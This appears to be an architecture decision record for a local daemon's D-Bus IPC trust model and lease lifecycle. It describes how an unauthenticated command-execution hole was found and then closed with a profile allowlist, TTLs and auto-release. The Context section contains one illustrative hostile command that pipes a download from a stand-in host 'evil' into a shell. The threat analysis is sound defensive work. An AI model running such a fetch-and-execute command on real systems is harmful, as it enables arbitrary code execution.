# ADR-0013: Coordinator IPC trust model + lease lifecycle

- Status: Accepted — **A2 + B4 + B5 + C7 implemented + GPU/bus-validated 2026-06-16** (Corey
  approved). Only **A1 (private socket)** + same-uid authz remain. See Implementation status.
- Date: 2026-06-16
- Relates to: ADR-0003 (fail-open), ADR-0006 (Hermes plugin → D-Bus lease), ADR-0010 (the daemon)
- Driver: [review scorecard 0005](../research/0005-coordinator-review-scorecard.md) findings
  S1 (Critical), H4 (High), M4 (Med) — deferred from the 2026-06-16 hardening pass because they
  are design decisions, not mechanical fixes.

## Context

`agentosd lease` (ADR-0010) is built and hardened, but three gaps are architectural, not bugs:

1. **S1 — the IPC boundary is open.** The daemon owns a *well-known name* on the **session bus**
   and `Spawn(tier, est, argv)` runs `argv` verbatim with **no caller authorization**. Any process
   in the session (a flatpak, a browser helper, a VS Code extension) can call
   `Spawn(best-effort, 0, ["sh","-c","curl evil|sh"])` → **arbitrary command execution as the user**.
   This is not live yet (no daemon is installed as a service), but it **must be closed before ship**.
2. **H4 — no lease lifecycle.** A cooperative `Acquire(interactive)` holder that crashes without
   `Release` holds the never-preemptible top tier **forever** → the overnight batch lane is wedged
   until restart. No peer-liveness, no TTL.
3. **M4 — no anti-strobe dwell.** Bursty interactive load can drive spawn→preempt→spawn churn
   (ComfyUI relaunch is expensive).

## Decision (proposed — pick per the options below)

### A. IPC trust (closes S1)
1. **Move off the shared session bus to a private peer socket.** Serve zbus peer-to-peer over a
   unix socket at `$XDG_RUNTIME_DIR/agentosd/coord.sock` (dir `0700`, socket `0600`); on accept,
   verify `SO_PEERCRED` uid == own uid. Only processes that can open a file you own can talk to it.
   *(Alternative if staying on the session bus: per-call `GetConnectionUnixUser == geteuid()` +
   an allowlist of caller bus names — weaker; the in-session confused-deputy remains.)*
2. **Replace caller-supplied `argv` with a static profile allowlist.** `Spawn(tier, est, profile,
   params)` where `profile ∈ {comfyui, dream-batch, …}` resolves to a **daemon-owned command
   vector** (model-proposes/code-disposes applied to IPC). The caller names an *intent*, never a
   binary. This closes the confused-deputy hole that uid-matching alone leaves open.
3. Keep the spawned child hardened (env scrubbed to a minimal set, explicit `current_dir`,
   `stdin=null`) — deferred from the hardening pass pending a test against real ComfyUI (full
   `env_clear` risks breaking the venv).

### B. Lease lifecycle (closes H4)
4. **Auto-release on holder disconnect.** Record the holder's unique bus name (or socket peer) at
   acquire; release its token on `NameOwnerChanged` / connection-close.
5. **Lease TTL + heartbeat** as a liveness backstop independent of transport: a holder renews
   within N seconds or the lease expires (fail-open: expiry frees the lane, never blocks interactive).
6. **Authorize who may take `interactive`** (the never-preemptible tier) — only the Hermes plugin.

### C. Anti-strobe (closes M4)
7. A per-tier **minimum dwell** in `LeaseState`: a just-preempted tier can't re-acquire for N
   seconds; the batch caller honors a backoff. Tie restore-to-idle to a dwell timer, not the instant
   of `Release`.

## Recommendation

Ship **A1 (private socket + SO_PEERCRED)** and **A2 (profile allowlist)** together — they close the
Critical with one architecture change and cost the least ongoing complexity. Add **B4 (peer-disconnect
auto-release)** in the same pass (cheap on a peer socket — it's just connection-close). Defer **B5
(TTL)**, **B6**, and **C7** to a follow-up once the Hermes plugin (ADR-0006) is real and we can see
the actual contention pattern.

## Open question for Corey

This changes the **ADR-0006 plugin call**: the plugin would open the private socket (not the session
bus) and call `Spawn(profile)` / `Acquire`, not `Spawn(argv)`. Confirm that's acceptable before
implementing — or, if the daemon will only ever be reachable by trusted local code you control and
never installed bus-wide, we could accept S1 as a documented risk and ship the lifecycle fixes only.

## Consequences

- Closes the unauthenticated-RCE surface without touching the (good) deterministic core, and without
  blocking interactive AI (ADR-0003 intact — inference runs via the gateway, not this exec path).
- The lease becomes crash-safe (no permanent lockout of the batch lane).
- `Spawn(argv)` as a general exec primitive over IPC is **removed** — the daemon owns its command
  vectors. Profiles are the new extension point (a profile is config the daemon reads, not an ADR).

## Implementation status (2026-06-16) — A2 + B4 landed + validated

Built in `crates/agentosd/src/lease.rs` (47 tests, clippy clean; live-proven via `busctl`):

- **A2 — launch-profile allowlist (closes S1, the RCE).** `Spawn(tier, est, argv)` is **gone**;
  `Spawn(tier, est, profile, params)` resolves `profile` against a daemon-owned static `PROFILES`
  map (`comfyui`, `sleep`) to an **absolute** command; `params` are appended as literal argv (execv,
  no shell). *Proven*: `Spawn … sh …` → `unknown profile` (rejected); `Spawn … sleep 600` → granted +
  owned. A D-Bus caller can no longer make agentosd run arbitrary commands.
- **B4 — peer-disconnect auto-release (closes H4).** The daemon records the **cooperative** holder's
  D-Bus unique name; the supervisor polls `name_has_owner` and frees the lease when that peer
  vanishes. *Proven*: a cooperative `interactive` holder whose caller exits is auto-released within a
  tick; an **owned** (`Spawn`) job is **not** (its lifecycle is the child, not the caller's
  connection — so `busctl`-per-call clients like `dream.sh` keep working across `Spawn`→`Release`).
- The dreaming client (`apps/dreaming/dream.sh`) now calls `Spawn` with `profile=comfyui`; the
  `comfyui` profile points at `start-comfyui.sh` (which now defaults `--preview-method latent2rgb`).

- **B5 — lease TTL + `Renew` heartbeat.** A holder past `lease_ttl()` (default 90 min; env
  `AGENTOSD_LEASE_TTL_SECS`) without a `Renew` is auto-expired by the supervisor — backstops a
  live-but-buggy holder *and* the owned-job-whose-caller-crashed gap that B4 deliberately leaves.
  `Renew(token)` extends it. *Proven*: TTL=2s → an owned job auto-released + SIGKILLed after expiry.
- **C7 — anti-strobe dwell.** A just-preempted tier can't re-acquire for `preempt_dwell()` (default
  8 s; env `AGENTOSD_PREEMPT_DWELL_SECS`); interactive is exempt. Stops spawn→preempt→spawn churn.
  *Proven*: dwell=3s → `Spawn batch` during the window → "cooling down"; granted again after it.

**Still remaining (the deferred deck):**
- **A1 — private peer socket + `SO_PEERCRED`.** The parallel keyhole work writes its `lease.json`
  mirror assuming the session bus; A2 already removed the *RCE*, so the residual is the in-session
  confused-deputy (a same-uid peer can spawn an *allowlisted* profile or hold the lease — no RCE). A
  same-uid `GetConnectionUnixUser` authz check is marginal on a single-user box and was skipped. The
  real closer is the `0600` peer socket — sequence it with the Hermes plugin (ADR-0006), which needs
  a socket-aware client anyway (it would also break `busctl`/`dream.sh`, so it's a deliberate later step).
  - **RESOLVED 2026-06-22 (ADR-0041 §5b) — declined for the single-user box; identity rests on the
    session bus's per-connection name, not a socket.** When ADR-0041's VRAM-demand-queue arbiter
    needed "enforceable per-principal authz" (waiter-cancel binding, per-principal flood caps,
    no-leak), a fresh look confirmed a `0600` peer socket buys ~nothing here: (1) the per-user session
    bus already keeps *other users* out (the only boundary `SO_PEERCRED uid==self` would add — and it
    is a tautology on a single-user bus, exactly as line 106 says); (2) a `0600` socket does NOT stop a
    *same-uid* confused-deputy either (every same-uid process can open it), so it doesn't close the
    residual it was filed against; (3) **same-uid peers are NOT indistinguishable on the session bus** —
    each connection has a unique bus name the bus daemon vouches for, which is exactly what the LIVE
    GO-2 binding (`holder_peer`/`may_release`, ADR-0021) already uses for per-connection release/renew
    authz. So the arbiter reuses that per-connection identity for waiter-cancel binding, and caps flood
    by **per-connection + global** bounds (per-*uid* = global on a single-user box). Migrating every
    client (mcp.rs, the jeepney/busctl Hermes plugin, `dream.sh`) to a raw socket for a marginal,
    already-provided property is rejected. A1 (the socket) is reopened only if AgentOS ever serves a
    *multi-user* or *system-bus* deployment; the cheap `GetConnectionUnixUser==geteuid()` belt-and-
    suspenders check is the documented forward path for that day, not a single-user requirement.

**Commit note:** these changes are interleaved with the in-flight keyhole work in `lease.rs`/`main.rs`/
`CLAUDE.md`, so they were left uncommitted at the time of writing (Corey commits the combined set).
